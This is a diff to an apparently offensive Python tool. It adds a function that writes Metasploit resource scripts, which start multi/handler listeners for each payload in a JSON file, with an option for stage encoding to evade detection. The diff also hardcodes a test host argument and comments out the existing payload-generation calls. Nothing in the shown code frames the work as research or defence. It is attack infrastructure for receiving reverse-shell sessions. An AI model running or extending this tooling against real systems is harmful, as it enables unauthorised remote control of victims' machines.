@@ -41,6 +41,21 @@ def generate_special_usage(data):
                 except KeyError:
                     pass
                 
+def generate_msf_resource_scipt(data):
+    f = open('setup_listener.rc','w')
+    for listener in data:
+        f.write('use exploit/multi/handler\n')
+        f.write('set payload '+listener['payload_name']+'\n')
+        f.write('set lport '+str(listener['port'])+'\n')
+        f.write('set lhost 0.0.0.0\n')
+        f.write('set exitonsessions false\n')
+        if 'stageencoder' in listener:
+            f.write('set enablestageencoding true\n')
+            f.write('set stageencoder '+listener['stageencoder']+'\n')
+        f.write('run -j\n\n')
+    
+    f.close()
+
 
 if __name__=='__main__':
 
@@ -52,8 +67,8 @@ if __name__=='__main__':
     #                     help='sum the integers (default: find the max)')
 
     # print(sys.argv)
-    args = parser.parse_args()
-    # args = parser.parse_args(['1.1.1.1'])
+    # args = parser.parse_args()
+    args = parser.parse_args(['1.1.1.1'])
     print(args)
 
     with open('all_payload.json','r') as f:
@@ -61,5 +76,6 @@ if __name__=='__main__':
 
     data = json.loads(json_data)
     # print(data)
-    generate_payload(data,args.host,dest_dir=args.dest_dir)
-    generate_special_usage(data)
+    # generate_payload(data,args.host,dest_dir=args.dest_dir)
+    # generate_special_usage(data)
+    generate_msf_resource_scipt(data)
